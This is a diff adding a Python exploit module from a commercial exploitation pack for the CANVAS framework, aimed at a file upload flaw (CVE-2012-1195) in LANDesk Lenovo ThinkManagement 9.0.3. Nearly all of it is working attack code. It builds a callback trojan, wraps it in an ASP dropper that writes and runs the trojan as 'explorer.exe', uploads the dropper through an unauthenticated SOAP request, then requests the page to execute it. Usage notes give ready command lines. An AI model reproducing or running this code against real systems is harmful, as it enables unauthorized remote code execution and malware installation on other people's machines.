@@ -1,0 +1,232 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys
+import random
+import time
+import thread
+import urllib, urllib2
+import xml.sax.saxutils as saxutils
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.spkproxy import header, body
+from libs.canvasos import *
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "LANDesk Lenovo ThinkManagement 9.0.3 File Upload Vulnerability"
+
+DESCRIPTION = "File upload vulnerability in LANDesk Lenovo ThinkManagement 9.0.3"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "LANDesk"
+DOCUMENTATION["Date public"] = "2012.03.19"
+DOCUMENTATION["VersionsAffected"] = "LANDesk Lenovo ThinkManagement 9.0.3"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.exploit-db.com/exploits/18622/"
+DOCUMENTATION["CVE Name"] = "CVE-2012-1195"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1195"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 12
+
+-- Single command mode --
+.\3rdparty\D2SEC\exploits\d2sec_emcrmc\d2sec_thinkmngt.py -t 192.168.59.132 -l 192.168.1.1 -d 443 -O cmd:"ipconfig.exe"
+
+-- Automatic MOSDEF trojan download and exec for Windows --
+.\3rdparty\D2SEC\exploits\d2sec_ora_secback\d2sec_thinkmngt.py -v 0 -t 192.168.59.132 -l 192.168.1.1 -d 443
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+    	tcpexploit.__init__(self)
+    	self.TROJANMODE = 0
+    	self.setInfo(DESCRIPTION)
+    	self.name = NAME       
+    	self.port = 80
+    	self.version = 0
+    	return
+
+
+    def file4hta(self, exename):
+    	evilprog = "explorer.exe"
+    	e = []
+    	
+    	for a in exename:
+    		for b in a:
+    			if b == "\r":
+    				d = "0d"
+    			elif b == "\n":
+    				d = "0a"
+    			elif b == "\0":
+    				d = "00"
+    			else:
+    				c = hex(ord(b))
+    				d = c.replace("0x", "")
+
+    			if len(d) == 1:
+    				d = "0"+d
+
+    			e.append(d)
+	
+    	i = 0
+    	j = 0
+    	l = len(e)
+
+    	hta = "<%\n\n"
+    	
+    	while 1:
+    		hta += " prog = prog & \""
+
+    		while i != 24:
+    			hta += "%s," % e[j]
+    			
+    			if j == l-1:
+    				break
+    				
+    			i += 1
+    			j += 1
+
+    		if j == l-1:
+    			hta = hta[:-1] + "\"\n\n"
+    			break
+    			
+    		hta += "\"\n"
+    		i = 0
+
+    	hta += " tmp = Split(prog, \",\")\n"	
+    	hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+    	hta += " Set shell = CreateObject(\"WScript.Shell\")\n" 
+    	hta += " dir = fso.GetSpecialFolder(2) & \"\\\" & fso.GetTempName()\n"
+    	hta += " fso.CreateFolder(dir)\n"     	
+    	hta += " path = dir & \"\\\" & \"%s\"\n" % evilprog    	
+    	hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+    	hta += " For i = 0 To UBound(tmp)\n"
+    	hta += "   prog = Int(\"&H\" & tmp(i))\n"
+    	hta += "   f.Write Chr(prog)\n"
+    	hta += " Next\n\n"
+    	hta += " f.Close\n"
+    	hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"    	
+    	hta += "%>\n"
+
+    	return hta
+ 
+ 
+    def maketrojan(self):   
+    	t_os = canvasos("Windows")
+    	t_os.arch = "X86"        
+    	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)            	        
+    	self.htafile = self.file4hta(self.mosdeftrojan)
+
+
+    def neededListenerTypes(self):
+    	from canvasengine import WIN32MOSDEF
+    	return [WIN32MOSDEF]
+
+  
+    def run(self):
+    	# Check arguments
+    	self.host = self.target.interface
+    	self.port = int(self.argsDict.get("port", self.port))
+                        	               
+    	self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+    	self.log("Attacking %s:%d"%(self.host, self.port))                      
+        
+        self.maketrojan()
+        
+    	s = self.gettcpsock()
+        
+    	try:
+    		s.connect((self.host, self.port))                        
+    	except:
+    		self.log('Could not connect to port %s:%s'%(self.host,self.port))
+
+    	payload = self.htafile 
+    	payload = payload.replace("&", "&amp;").replace("\"", "&quot;").replace("'", "&#039;").replace("<", "&lt;").replace(">", "&gt;")
+        
+    	soap = """<?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <RunAMTCommand xmlns="http://tempuri.org/">
+              <Command>-PutUpdateFileCore</Command>
+              <Data1>d2d2d2</Data1>
+              <Data2>upl\d2.asp</Data2>
+              <Data3><PAYLOAD></Data3>
+              <ReturnString>bbbb</ReturnString>
+            </RunAMTCommand>
+          </soap:Body>
+        </soap:Envelope>
+    	"""
+        
+    	soap = soap.replace('<PAYLOAD>', payload)
+		
+    	buff =  "POST /landesk/managementsuite/core/core.anonymous/ServerSetup.asmx HTTP/1.1\r\n"
+    	buff += "Host: " + self.host + "\r\n"    
+        buff += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)\r\n"	
+    	buff += "Content-Type: text/xml; charset=utf-8\r\n"
+    	buff += "SOAPAction: \"http://tempuri.org/RunAMTCommand\"\r\n"          	     	    	
+    	buff += "Content-Length: " + str(len(soap)) + "\r\n"
+    	buff += "Connection: Keep-Alive\r\n"
+    	buff += "\r\n"
+    	buff += soap    	
+    	buff += "\r\n\r\n"
+    	
+    	s.send(buff)                        
+        
+    	buff = "GET /upl/d2.asp HTTP/1.1\r\n"    	
+    	buff += "Host: " + self.host + "\r\n"
+        buff += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)\r\n"
+    	buff += "Connection: Keep-Alive\r\n"                    	    	    	
+    	buff += "\r\n"    	            
+
+    	s.send(buff)                    			    			
+    	s.close()
+                          
+    	return 1
+    	
+        		
+    def usage(self):        
+    	print "Usage: %s -t targethost -l localip -d localport [-O cmd:command]\n" % sys.argv[0]
+
+    	i = 0
+
+    	print 'Available versions:'
+
+    	for listline in targets.values():
+    		print '\t%d: %s'%(i, listline)
+    		i = i + 1
+
+    	sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
